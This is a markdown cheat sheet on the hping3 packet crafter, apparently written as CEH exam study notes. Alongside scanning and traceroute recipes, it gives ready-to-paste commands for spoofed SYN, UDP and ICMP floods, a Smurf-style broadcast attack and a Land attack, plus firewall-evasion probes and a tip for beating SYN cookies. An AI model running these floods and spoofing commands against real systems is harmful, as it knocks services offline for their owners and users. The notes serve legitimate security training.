# hping3 — TCP/IP packet crafter

> **The Swiss army knife for custom packets.** Use it for firewall rule testing, port scanning with arbitrary flags, SYN floods, traceroute over TCP, and crafting ICMP/UDP/TCP packets exactly how you want them. CEH loves hping3 for DoS and firewall-evasion questions.

**Install check (Parrot — already installed):** `hping3 --version`

**Needs root** (raw sockets).

---

## 🎯 Cheat-flow: "What packet do I craft?"

| Goal | Command | Why |
|---|---|---|
| **Ping replacement** (ICMP blocked) | `sudo hping3 -1 <IP>` | ICMP mode |
| TCP ping (no payload) | `sudo hping3 -S -p 80 -c 3 <IP>` | 3 SYNs to 80 |
| **Port scan with SYN** | `sudo hping3 -S -p ++1 -c 100 <IP>` | Increment port |
| Check if a single port is open | `sudo hping3 -S -p 443 -c 1 <IP>` | SA flags back = open |
| **SYN flood** (DoS lab) | `sudo hping3 -S -p 80 --flood --rand-source <IP>` | Fast random-src SYNs |
| UDP flood | `sudo hping3 --udp -p 53 --flood <IP>` | UDP DoS |
| ICMP flood | `sudo hping3 -1 --flood <IP>` | Ping flood |
| **Firewall rule test** | `sudo hping3 -S -p 22 -c 1 <IP>` | Any reply = reachable |
| Spoof source IP | `sudo hping3 -S -a <FAKE_IP> -p 80 <IP>` | Impersonate |
| Traceroute over TCP 80 | `sudo hping3 --traceroute -V -S -p 80 <IP>` | TCP TTL trace |

---

## 🔑 Flags you must know cold

### Mode (pick one)
| Flag | Mode |
|---|---|
| `-0` / `--rawip` | Raw IP |
| `-1` / `--icmp` | **ICMP** |
| `-2` / `--udp` | **UDP** |
| `-8` / `--scan` | Scan mode |
| `-9` / `--listen` | Listen mode |
| *(default)* | **TCP** |

### TCP flags
| Flag | Meaning |
|---|---|
| `-S` | Set **SYN** |
| `-A` | Set ACK |
| `-F` | Set FIN |
| `-R` | Set RST |
| `-P` | Set PSH |
| `-U` | Set URG |
| `-X` | Set Xmas (all) |
| `-Y` | Set Ymas |

### Targeting
| Flag | Meaning |
|---|---|
| `-p <port>` | Destination port |
| `-p ++<start>` | Increment port each packet |
| `-s <port>` | Source port |
| `-k` | Keep source port constant |
| `-a <IP>` | **Spoof source IP** |
| `--rand-source` | Random source IP each packet |
| `--rand-dest` | Random destination IP |

### Volume / timing
| Flag | Meaning |
|---|---|
| `-c <N>` | Count — stop after N packets |
| `-i u<us>` | Interval in microseconds (`-i u100` = 100us) |
| `-i <s>` | Interval in seconds |
| `--flood` | **As fast as possible, don't show replies** |
| `--faster` | Faster than default |

### Payload
| Flag | Meaning |
|---|---|
| `-d <size>` | Data size in bytes |
| `-E <file>` | Read payload from file |
| `-e <sig>` | Signature string |

### Misc
| Flag | Meaning |
|---|---|
| `-V` | Verbose |
| `-n` | No DNS resolution |
| `-t <ttl>` | TTL value |
| `--traceroute` | Traceroute mode (with TTL increment) |
| `-f` | Fragment packets |

---

## 📋 Command recipes (copy-paste)

```bash
# 1. ICMP ping (when regular ping is blocked — sometimes you still get a reply)
sudo hping3 -1 <IP>

# 2. TCP SYN "ping" to port 80 — confirm host is up even with ICMP blocked
sudo hping3 -S -p 80 -c 3 <IP>

# 3. Single-port open check (look for "flags=SA" reply = open)
sudo hping3 -S -p 443 -c 1 <IP>

# 4. SYN scan ports 1-1000 (one packet per port)
sudo hping3 -S -p ++1 -c 1000 <IP>

# 5. SYN flood (exam "perform a DoS" question)
sudo hping3 -S -p 80 --flood --rand-source <IP>

# 6. UDP flood on port 53
sudo hping3 --udp -p 53 --flood --rand-source <IP>

# 7. ICMP flood
sudo hping3 -1 --flood <IP>

# 8. Smurf-ish: spoof source to victim, bounce off broadcast
sudo hping3 -1 -a <VICTIM_IP> <BROADCAST>

# 9. Land attack (src == dst)
sudo hping3 -S -p 80 -a <IP> <IP>

# 10. Firewall ACL testing — FIN/Xmas/Null sneak past stateless rules
sudo hping3 -F -p 22 -c 1 <IP>
sudo hping3 -X -p 22 -c 1 <IP>     # Xmas (FIN+PSH+URG)
sudo hping3     -p 22 -c 1 <IP>    # Null (no flags)

# 11. Traceroute on TCP 443 (bypasses ICMP-blocking routers)
sudo hping3 --traceroute -V -S -p 443 <IP>

# 12. Custom payload — 100 bytes of data
sudo hping3 -S -p 80 -d 100 -E payload.txt <IP>

# 13. Source-port trick (stateless firewalls may allow src 53)
sudo hping3 -S -s 53 -k -p 80 <IP>
```

---

## 🔑 Reading replies

When you send `-S -p 80` you get back flag strings:

| Reply | Meaning |
|---|---|
| `flags=SA` | **SYN-ACK → port OPEN** |
| `flags=RA` | RST-ACK → port CLOSED |
| *(no reply)* | **FILTERED** (firewall drop) |
| `ICMP unreachable` | Filtered / host-unreach |

---

## ⚠️ Gotchas

- **Requires root.** Every command above needs `sudo`.
- **`--flood` suppresses replies** — you won't see port status during a flood. Use `-c` + normal mode for scans.
- **`--rand-source` + stateful return path:** you won't see replies because spoofed src means the SYN-ACK goes elsewhere. That's fine for DoS, bad for scans.
- **Port increment syntax:** `-p ++1` means "start at 1 and add 1 each packet." Use with `-c` to bound it.
- **Spoofing** only works if your egress network doesn't do BCP38 / uRPF filtering (lab environments usually don't).
- **SYN flood not doing damage?** Target may have SYN cookies enabled. Combine with `--rand-source` and high rate.
- **Exam DoS questions** usually want you to run the attack *and* observe the effect in Wireshark or the target's service going down. See [wireshark](wireshark.md) with filter `tcp.flags.syn == 1`.
- **nmap vs hping3:** nmap is faster for scans. hping3 wins when you need one specific crafted packet or a DoS.
- **Don't run `--flood` against shared exam infrastructure** without being sure it's your own VM — you can crash things.

---

## 🔗 Related

- [nmap](nmap.md) — for actual port scanning; hping3 is for crafting
- [wireshark](wireshark.md) — observe the packets you're sending
- [14-dos domain README](../14-dos/README.md)
- [DoS playbook](../playbooks/dos-playbook.md)
